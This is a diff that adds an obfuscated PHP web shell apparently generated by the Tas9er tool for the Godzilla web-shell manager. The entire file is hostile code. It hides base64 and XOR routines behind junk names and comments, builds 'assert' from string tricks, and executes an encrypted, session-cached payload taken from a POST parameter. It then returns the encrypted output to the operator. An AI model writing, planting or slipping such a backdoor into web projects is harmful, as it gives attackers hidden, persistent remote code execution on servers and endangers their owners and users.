@@ -1,0 +1,39 @@
+Hello Administrator!
+WelCome To Tas9er Godzilla PHP Console!
+<?pHP
+@session_start();
+@set_time_limit(Chr("48"));
+@error_reporting/*fuckgovhYJGzm6zdCxwb*/(Chr("48"));
+function baiduO0F1RnW4Myaj(/*fuckgovJ8L*/$baiduq97GkGslcfPQq,$baidu549QM2yyoPxiD){
+    for($baidu0=Chr("48");$baidu0<strlen($baiduq97GkGslcfPQq);$baidu0++) {
+        $baiduFwhc9 = $baidu549QM2yyoPxiD[$baidu0+Chr("49")&15];
+        $baiduq97GkGslcfPQq[$baidu0] = $baiduq97GkGslcfPQq[$baidu0]^$baiduFwhc9;
+    }
+    return $baiduq97GkGslcfPQq;
+}
+$baiduKre = "bas"."e6".Chr("52")."_"."de"."cod".Chr("101");
+$base64_baiduO0F1RnW4Myaj = "bas"."e6".Chr("52")."_e".Chr("110").Chr("99")."ode";
+$baiduGRXbF97H6=("&"^"r").("7"^"V").("I"^":").("p"^"I").("_"^":").$baiduKre($baiduKre("Y2c9PQ=="));
+$baiduHzBDTV5SeO30EDc='p'.$baiduKre($baiduKre("WVhsc2IyRms="));
+$baiduuzI5AgsEqHFHZO='b2899c1d'.$baiduKre("YzAzMTYyYzI=");
+$baiduB9dvgGZ=("!"^"@").'ss'.Chr("101").'rs';
+$baiduB9dvgGZ++;
+if (isset($_POST/*fuckgovWXNfdT*/[$baiduGRXbF97H6])){
+    $datbaiduB9dvgGZ=baiduO0F1RnW4Myaj/*fuckgovui1gSA23J01*/($baiduKre($_POST[$baiduGRXbF97H6]),$baiduuzI5AgsEqHFHZO);
+    if (/*fuckgovswXq*/isset($_SESSION/*fuckgovJUkpYCy*/[$baiduHzBDTV5SeO30EDc])){
+        $baiduxoF=baiduO0F1RnW4Myaj($_SESSION/*fuckgovPfOPHi4Id1yo*/[$baiduHzBDTV5SeO30EDc],$baiduuzI5AgsEqHFHZO);
+        if (/*fuckgovTDC*/strpos($baiduxoF,$baiduKre/*fuckgov468iFH7m*/($baiduKre("WjJWMFFtRnphV056U1c1bWJ3PT0=")))===false){
+            $baiduxoF=baiduO0F1RnW4Myaj/*fuckgovw4726g1YCwGQsxv*/($baiduxoF,$baiduuzI5AgsEqHFHZO);
+        }
+		define("baiduc16Ps","//baiduI0eLDlxv\r\n".$baiduxoF);
+		$baiduB9dvgGZ(baiduc16Ps);
+        echo substr(/*fuckgovOyxD*/md5/*fuckgovN8GZQyhFGWFZV*/($baiduGRXbF97H6.$baiduuzI5AgsEqHFHZO),Chr("48"),16);
+        echo $base64_baiduO0F1RnW4Myaj(baiduO0F1RnW4Myaj(@run($datbaiduB9dvgGZ),$baiduuzI5AgsEqHFHZO));
+        echo substr(/*fuckgovwMLlxO1xTDHWuV0*/md5/*fuckgoveA5en*/($baiduGRXbF97H6.$baiduuzI5AgsEqHFHZO),16);
+    }else{
+        if (strpos/*fuckgovjJZSM*/($datbaiduB9dvgGZ,$baiduKre($baiduKre("WjJWMFFtRnphV056U1c1bWJ3PT0=")))!==false){
+            $_SESSION[$baiduHzBDTV5SeO30EDc]=baiduO0F1RnW4Myaj($datbaiduB9dvgGZ,$baiduuzI5AgsEqHFHZO);
+        }
+    }
+}
+?>
